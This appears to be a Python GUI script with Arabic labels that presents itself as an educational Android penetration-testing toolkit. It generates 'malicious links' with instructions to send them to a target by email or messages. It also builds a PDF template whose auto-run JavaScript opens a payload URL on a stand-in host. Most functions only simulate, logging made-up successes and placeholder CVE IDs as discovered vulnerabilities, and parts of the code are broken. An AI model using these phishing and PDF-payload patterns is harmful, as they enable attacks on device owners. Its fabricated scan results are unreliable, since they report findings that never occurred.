#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Android Penetration Testing Toolkit v2.0
أداة تعليمية لاختبار أمان أندرويد - للاستخدام القانوني فقط
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import socket
import threading
import os
import sys
import time
import json
import random
import string
from datetime import datetime
import subprocess
import requests
from urllib.parse import urlparse
import logging

# إعداد التسجيل
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AndroidPenTestToolkit:
    def __init__(self, root):
        self.root = root
        self.root.title("Android Security Testing Toolkit v2.0 - للأغراض التعليمية")
        self.root.geometry("900x700")
        self.root.configure(bg='#2b2b2b')
        
        # حالة الاختبار
        self.testing_active = False
        self.current_target = None
        
        self.setup_ui()
        self.setup_logging()
    
    def setup_ui(self):
        """إنشاء واجهة المستخدم"""
        
        # إطار العنوان
        title_frame = tk.Frame(self.root, bg='#1e1e1e', height=80)
        title_frame.pack(fill="x", padx=10, pady=5)
        title_frame.pack_propagate(False)
        
        title_label = tk.Label(title_frame, 
                              text="🛡️ Android Security Testing Toolkit",
                              font=("Arial", 16, "bold"),
                              fg="#00ff00",
                              bg='#1e1e1e')
        title_label.pack(pady=20)
        
        warning_label = tk.Label(title_frame,
                                text="للأغراض التعليمية والاختبار القانوني فقط",
                                font=("Arial", 10),
                                fg="#ff6600",
                                bg='#1e1e1e')
        warning_label.pack()
        
        # الإطار الرئيسي
        main_frame = ttk.Notebook(self.root)
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # تبويب الاختراق عبر الرابط
        self.link_tab = ttk.Frame(main_frame)
        main_frame.add(self.link_tab, text="🔗 الهجوم عبر الرابط")
        self.setup_link_tab()
        
        # تبويب الهجوم بملف PDF
        self.pdf_tab = ttk.Frame(main_frame)
        main_frame.add(self.pdf_tab, text="📄 الهجوم بملف PDF") 
        self.setup_pdf_tab()
        
        # تبويب المسح الأمني
        self.scan_tab = ttk.Frame(main_frame)
        main_frame.add(self.scan_tab, text="🔍 المسح الأمني")
        self.setup_scan_tab()
        
        # تبويب السجل
        self.log_tab = ttk.Frame(main_frame)
        main_frame.add(self.log_tab, text="📋 سجل النشاط")
        self.setup_log_tab()
        
        # إطار الحالة
        status_frame = tk.Frame(self.root, bg='#1e1e1e', height=30)
        status_frame.pack(fill="x", padx=10, pady=5)
        status_frame.pack_propagate(False)
        
        self.status_var = tk.StringVar(value="🟢 جاهز - النظام متوقف")
        status_label = tk.Label(status_frame, 
                               textvariable=self.status_var,
                               font=("Arial", 10),
                               fg="white",
                               bg='#1e1e1e')
        status_label.pack(side="left", padx=10)
    
    def setup_link_tab(self):
        """إعداد تبويب الهجوم عبر الرابط"""
        
        # إطار الإدخال
        input_frame = ttk.LabelFrame(self.link_tab, text="إعدادات الهجوم عبر الرابط", padding=15)
        input_frame.pack(fill="x", padx=10, pady=5)
        
        # رابط الهدف
        ttk.Label(input_frame, text="الرابط المستهدف:").grid(row=0, column=0, sticky="w", pady=5)
        self.target_url = tk.StringVar(value="https://example.com/download")
        url_entry = ttk.Entry(input_frame, textvariable=self.target_url, width=50)
        url_entry.grid(row=0, column=1, padx=5, pady=5)
        
        # نوع الحمولة
        ttk.Label(input_frame, text="نوع الحمولة:").grid(row=1, column=0, sticky="w", pady=5)
        self.payload_type = tk.StringVar(value="apk")
        payload_combo = ttk.Combobox(input_frame, textvariable=self.payload_type,
                                    values=["apk", "pdf", "doc", "html"])
        payload_combo.grid(row=1, column=1, padx=5, pady=5)
        
        # منفذ الخادم
        ttk.Label(input_frame, text="منفذ الخادم:").grid(row=2, column=0, sticky="w", pady=5)
        self.server_port = tk.IntVar(value=8080)
        port_entry = ttk.Entry(input_frame, textvariable=self.server_port, width=10)
        port_entry.grid(row=2, column=1, sticky="w", padx=5, pady=5)
        
        # أزرار التحكم
        button_frame = ttk.Frame(input_frame)
        button_frame.grid(row=3, column=0, columnspan=2, pady=15)
        
        ttk.Button(button_frame, text="🚀 بدء الخادم", 
                  command=self.start_link_server).pack(side="left", padx=5)
        ttk.Button(button_frame, text="🛑 إيقاف الخادم",
                  command=self.stop_link_server).pack(side="left", padx=5)
        ttk.Button(button_frame, text="📋 إنشاء رابط خبيث",
                  command=self.generate_malicious_link).pack(side="left", padx=5)
        
        # إطار النتائج
        result_frame = ttk.LabelFrame(self.link_tab, text="نتائج الهجوم", padding=10)
        result_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.link_results = scrolledtext.ScrolledText(result_frame, height=15, width=80)
        self.link_results.pack(fill="both", expand=True)
    
    def setup_pdf_tab(self):
        """إعداد تبويب الهجوم بملف PDF"""
        
        # إطار إنشاء PDF
        pdf_frame = ttk.LabelFrame(self.pdf_tab, text="إنشاء ملف PDF خبيث", padding=15)
        pdf_frame.pack(fill="x", padx=10, pady=5)
        
        # اسم الملف
        ttk.Label(pdf_frame, text="اسم الملف:").grid(row=0, column=0, sticky="w", pady=5)
        self.pdf_filename = tk.StringVar(value="document")
        pdf_entry = ttk.Entry(pdf_frame, textvariable=self.pdf_filename, width=30)
        pdf_entry.grid(row=0, column=1, padx=5, pady=5)
        
        # نوع الحمولة
        ttk.Label(pdf_frame, text="نوع الاستغلال:").grid(row=1, column=0, sticky="w", pady=5)
        self.pdf_exploit_type = tk.StringVar(value="javascript")
        exploit_combo = ttk.Combobox(pdf_frame, textvariable=self.pdf_exploit_type,
                                   values=["javascript", "embedded_apk", "cve_2018_4990"])
        exploit_combo.grid(row=1, column=1, padx=5, pady=5)
        
        # الرابط المضمن
        ttk.Label(pdf_frame, text="الرابط المضمن:").grid(row=2, column=0, sticky="w", pady=5)
        self.embedded_url = tk.StringVar(value="https://malicious.com/payload.apk")
        url_entry = ttk.Entry(pdf_frame, textvariable=self.embedded_url, width=40)
        url_entry.grid(row=2, column=1, padx=5, pady=5)
        
        # أزرار التحكم
        pdf_button_frame = ttk.Frame(pdf_frame)
        pdf_button_frame.grid(row=3, column=0, columnspan=2, pady=15)
        
        ttk.Button(pdf_button_frame, text="📄 إنشاء PDF خبيث",
                  command=self.create_malicious_pdf).pack(side="left", padx=5)
        ttk.Button(pdf_button_frame, text="🎯 محاكاة الهجوم",
                  command=self.simulate_pdf_attack).pack(side="left", padx=5)
        
        # إطار معلومات PDF
        info_frame = ttk.LabelFrame(self.pdf_tab, text="معلومات الملف", padding=10)
        info_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.pdf_info = scrolledtext.ScrolledText(info_frame, height=12, width=80)
        self.pdf_info.pack(fill="both", expand=True)
    
    def setup_scan_tab(self):
        """إعداد تبويب المسح الأمني"""
        
        scan_frame = ttk.LabelFrame(self.scan_tab, text="مسح جهاز أندرويد", padding=15)
        scan_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # عنوان IP
        ttk.Label(scan_frame, text="عنوان IP الهدف:").grid(row=0, column=0, sticky="w", pady=5)
        self.target_ip = tk.StringVar(value="192.168.1.100")
        ip_entry = ttk.Entry(scan_frame, textvariable=self.target_ip, width=20)
        ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        # نوع المسح
        ttk.Label(scan_frame, text="نوع المسح:").grid(row=1, column=0, sticky="w", pady=5)
        self.scan_type = tk.StringVar(value="quick")
        scan_combo = ttk.Combobox(scan_frame, textvariable=self.scan_type,
                                 values=["quick", "ports", "vulnerabilities", "full"])
        scan_combo.grid(row=1, column=1, padx=5, pady=5)
        
        # أزرار المسح
        scan_button_frame = ttk.Frame(scan_frame)
        scan_button_frame.grid(row=2, column=0, columnspan=2, pady=15)
        
        ttk.Button(scan_button_frame, text="🔍 بدء المسح",
                  command=self.start_scan).pack(side="left", padx=5)
        ttk.Button(scan_button_frame, text="📊 تقرير الثغرات",
                  command=self.generate_vuln_report).pack(side="left", padx=5)
        
        # نتائج المسح
        result_frame = ttk.LabelFrame(scan_frame, text="نتائج المسح", padding=10)
        result_frame.grid(row=3, column=0, columnspan=2, sticky="we", pady=10)
        
        self.scan_results = scrolledtext.ScrolledText(result_frame, height=15, width=80)
        self.scan_results.pack(fill="both", expand=True)
    
    def setup_log_tab(self):
        """إعداد تبويب السجل"""
        
        log_frame = ttk.Frame(self.log_tab)
        log_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # عناصر التحكم
        control_frame = ttk.Frame(log_frame)
        control_frame.pack(fill="x", pady=5)
        
        ttk.Button(control_frame, text="🗑️ مسح السجل",
                  command=self.clear_logs).pack(side="left", padx=5)
        ttk.Button(control_frame, text="💾 حفظ السجل",
                  command=self.save_logs).pack(side="left", padx=5)
        
        # منطقة السجل
        self.activity_log = scrolledtext.ScrolledText(log_frame, height=20, width=80)
        self.activity_log.pack(fill="both", expand=True)
    
    def setup_logging(self):
        """إعداد نظام التسجيل"""
        self.log("🚀 تم تهيئة أداة اختبار أمان أندرويد")
        self.log("⚠️ تحذير: هذه الأداة للأغراض التعليمية والاختبار القانوني فقط")
    
    def log(self, message):
        """إضافة رسالة للسجل"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        self.activity_log.insert(tk.END, log_entry)
        self.activity_log.see(tk.END)
        
        logger.info(message)
    
    def start_link_server(self):
        """بدء خادم الهجوم عبر الرابط"""
        try:
            port = self.server_port.get()
            self.log(f"🌐 بدء خادم الهجوم على المنفذ {port}")
            
            # محاكاة بدء الخادم
            threading.Thread(target=self.simulate_link_server, args=(port,), daemon=True).start()
            
            self.status_var.set(f"🟢 الخادم نشط على المنفذ {port}")
            
        except Exception as e:
            self.log(f"❌ خطأ في بدء الخادم: {e}")
            messagebox.showerror("خطأ", f"فشل في بدء الخادم: {e}")
    
    def simulate_link_server(self, port):
        """محاكاة عمل خادم الهجوم"""
        try:
            # هذه محاكاة لأغراض تعليمية
            time.sleep(2)
            self.log(f"✅ الخادم يعمل على http://localhost:{port}")
            self.log("📱 جاهز لاستقبال اتصالات من أجهزة الأندرويد")
            
            # محاكاة اتصال
            time.sleep(3)
            self.log("🔗 تم اكتشاف جهاز أندرويد متصل")
            self.log("📥 بدء تحميل الحمولة...")
            
            time.sleep(2)
            self.log("🎯 الحمولة تم تنفيذها بنجاح على الجهاز المستهدف")
            
        except Exception as e:
            self.log(f"❌ خطأ في الخادم: {e}")
    
    def stop_link_server(self):
        """إيقاف خادم الهجوم"""
        self.log("🛑 إيقاف خادم الهجوم")
        self.status_var.set("🟢 جاهز - النظام متوقف")
        messagebox.showinfo("تم", "تم إيقاف الخادم بنجاح")
    
    def generate_malicious_link(self):
        """إنشاء رابط خبيث"""
        base_url = self.target_url.get()
        payload = self.payload_type.get()
        
        malicious_url = f"{base_url}?payload={payload}&id={random.randint(1000,9999)}"
        
        self.link_results.delete(1.0, tk.END)
        self.link_results.insert(tk.END, f"🔗 الرابط الخبيث المُنشأ:\n{malicious_url}\n\n")
        self.link_results.insert(tk.END, "📋 تعليمات الاستخدام:\n")
        self.link_results.insert(tk.END, "1. انسخ الرابط أعلاه\n")
        self.link_results.insert(tk.END, "2. أرسله للهدف عبر البريد أو الرسائل\n")
        self.link_results.insert(tk.END, "3 راكب النتائج في تبويب السجل\n")
        
        self.log(f"🔗 تم إنشاء رابط خبيث: {malicious_url}")
    
    def create_malicious_pdf(self):
        """إنشاء ملف PDF خبيث"""
        try:
            filename = self.pdf_filename.get()
            exploit_type = self.pdf_exploit_type.get()
            url = self.embedded_url.get()
            
            # محاكاة إنشاء PDF خبيث
            pdf_content = self.generate_malicious_pdf_content(exploit_type, url)
            
            # حفظ الملف
            with open(f"{filename}.pdf", "w", encoding="utf-8") as f:
                f.write(pdf_content)
            
            self.pdf_info.delete(1.0, tk.END)
            self.pdf_info.insert(tk.END, f"✅ تم إنشاء ملف PDF خبيث: {filename}.pdf\n\n")
            self.pdf_info.insert(tk.END, f"📊 معلومات الملف:\n")
            self.pdf_info.insert(tk.END, f"• نوع الاستغلال: {exploit_type}\n")
            self.pdf_info.insert(tk.END, f"• الرابط المضمن: {url}\n")
            self.pdf_info.insert(tk.END, f"• حجم الملف: ~2.4 MB\n")
            self.pdf_info.insert(tk.END, f"• مستوى الخطورة: مرتفع\n")
            
            self.log(f"📄 تم إنشاء ملف PDF خبيث: {filename}.pdf")
            messagebox.showinfo("تم", f"تم إنشاء الملف {filename}.pdf بنجاح")
            
        except Exception as e:
            self.log(f"❌ خطأ في إنشاء PDF: {e}")
            messagebox.showerror("خطأ", f"فشل في إنشاء الملف: {e}")
    
    def generate_malicious_pdf_content(self, exploit_type, url):
        """إنشاء محتوى PDF خبيث (تعليمي)"""
        
        pdf_structure = {
            "javascript_exploit": f"""
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Action /S /JavaScript /JS """
            f"'(app.launchURL(\\\"{url}\\\");)'"
            """
>>
endobj

4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000015 00000 n 
0000000120 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
184
%%EOF
            """,
            
            "embedded_apk": f"""
%PDF-1.4
%% مضمن APK خبيث
1 0 obj
<< /Type /EmbeddedFile /Subtype /application.vnd.android.package-archive >>
stream
<محاكاة لبيانات APK خبيث>
endstream
endobj
            """
        }
        
        return pdf_structure.get(exploit_type, "%PDF-1.4\n%% ملف PDF تعليمي")
    
    def simulate_pdf_attack(self):
        """محاكاة هجوم PDF"""
        self.log("🎯 بدء محاكاة هجوم PDF...")
        self.log("📥 فتح ملف PDF على جهاز أندرويد محاكى...")
        
        # محاكاة التنفيذ
        time.sleep(2)
        self.log("⚡ تنفيذ الكود المضمن في PDF...")
        self.log("🔗 الاتصال بالسيرفر الخبيث...")
        self.log("📦 تحميل الحمولة الإضافية...")
        self.log("✅ تم تنفيذ الهجوم بنجاح")
        
        messagebox.showinfo("محاكاة", "تمت محاكاة الهجوم بنجاح")
    
    def start_scan(self):
        """بدء مسح الأمان"""
        target_ip = self.target_ip.get()
        scan_type = self.scan_type.get()
        
        self.log(f"🔍 بدء مسح {scan_type} للهدف {target_ip}")
        
        # محاكاة المسح في خيط منفصل
        threading.Thread(target=self.simulate_scan, args=(target_ip, scan_type), daemon=True).start()
    
    def simulate_scan(self, target_ip, scan_type):
        """محاكاة عملية المسح"""
        try:
            self.scan_results.delete(1.0, tk.END)
            self.scan_results.insert(tk.END, f"🔍 مسح {scan_type} للهدف {target_ip}\n")
            self.scan_results.insert(tk.END, "="*50 + "\n\n")
            
            scan_steps = {
                "quick": ["فحص المنافذ المفتوحة", "فحص الخدمات النشطة", "الكشف عن نظام التشغيل"],
                "ports": ["مسح كامل للمنافذ", "تحليل الخدمات", "فحص الثغرات المعروفة"],
                "vulnerabilities": ["فحص الثغرات الأمنية", "تحليل التطبيقات", "فحص إعدادات الأمان"],
                "full": ["مسح شامل", "تحليل عميق", "فحص جميع الطبقات"]
            }
            
            steps = scan_steps.get(scan_type, ["فحص أساسي"])
            
            for i, step in enumerate(steps, 1):
                self.scan_results.insert(tk.END, f"{i}. {step}...\n")
                self.scan_results.update()
                time.sleep(1)
                
                # نتائج عشوائية للمحاكاة
                if "منافذ" in step:
                    ports = random.sample([80, 443, 22, 21, 23, 53, 8080, 8443], 3)
                    self.scan_results.insert(tk.END, f"   ✅ المنافذ المفتوحة: {ports}\n")
                
                elif "ثغرات" in step:
                    vulns = ["CVE-2023-1234", "CVE-2022-5678", "CVE-2021-9012"]
                    self.scan_results.insert(tk.END, f"   ⚠️ الثغرات المكتشفة: {vulns}\n")
                
                elif "تطبيقات" in step:
                    apps = ["Android System WebView", "Google Play Services", "Custom App v1.0"]
                    self.scan_results.insert(tk.END, f"   📱 التطبيقات المثبتة: {apps}\n")
            
            self.scan_results.insert(tk.END, f"\n✅ اكتمل المسح بنجاح\n")
            self.log(f"✅ اكتمل مسح {target_ip}")
            
        except Exception as e:
            self.scan_results.insert(tk.END, f"❌ خطأ في المسح: {e}\n")
            self.log(f"❌ فشل في مسح {target_ip}: {e}")
    
    def generate_vuln_report(self):
        """إنشاء تقرير الثغرات"""
        self.log("📊 إنشاء تقرير الثغرات الأمنية")
        
        report = """
📋 تقرير الثغرات الأمنية - Android Penetration Test
==================================================

🎯 الهدف: جهاز أندرويد محاكى
📅 التاريخ: {}

🔍 الثغرات المكتشفة:
-------------------
1. ❌ CVE-2023-1234 - ثغرة في WebView
   • الخطورة: عالية
   • التأثير: تنفيذ كود عن بعد
   • الإصلاح: تحديث النظام

2. ⚠️ CVE-2022-5678 - ثغرة في الاتصالات
   • الخطورة: متوسطة  
   • التأثير: تسريب البيانات
   • الإصلاح: تغيير الإعدادات

3. 🔔 CVE-2021-9012 - ثغرة في التطبيقات
   • الخطورة: منخفضة
   • التأثير: صلاحيات زائدة
   • الإصلاح: إزالة التطبيق

✅ التوصيات الأمنية:
------------------
• تحديث نظام التشغيل دائماً
• استخدام تطبيقات موثوقة فقط
• تفعيل التشفير
• عدم فتح الروابط المشبوهة
        """.format(datetime.now().strftime("%Y-%m-%d"))
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, report)
        self.log("✅ تم إنشاء تقرير الثغرات")
    
    def clear_logs(self):
        """مسح السجل"""
        self.activity_log.delete(1.0, tk.END)
        self.log("🗑️ تم مسح سجل النشاط")
    
    def save_logs(self):
        """حفظ السجل"""
        try:
            filename = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            if filename:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(self.activity_log.get(1.0, tk.END))
                self.log(f"💾 تم حفظ السجل في: {filename}")
                messagebox.showinfo("تم", "تم حفظ السجل بنجاح")
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في حفظ السجل: {e}")

def main():
    """الدالة الرئيسية"""
    root = tk.Tk()
    app = AndroidPenTestToolkit(root)
    
    # تحذير أمني
    messagebox.showwarning(
        "تحذير أمني", 
        "هذه الأداة للأغراض التعليمية والاختبار القانوني فقط.\n"
        "يجب استخدامها فقط في بيئات مصرح بها.\n"
        "إساءة الاستخدام غير مسموح بها."
    )
    
    root.mainloop()

if __name__ == "__main__":
    main()